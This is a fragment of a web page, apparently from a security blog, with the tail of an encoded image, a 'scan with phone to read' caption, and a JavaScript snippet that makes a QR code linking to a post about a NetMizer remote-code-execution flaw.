qC+4DSTkitefwDWQ189gt4P/AQAA//+FmcpcAAAABklEQVQDANyXOqdPpysIAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-search-position-nodeid-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 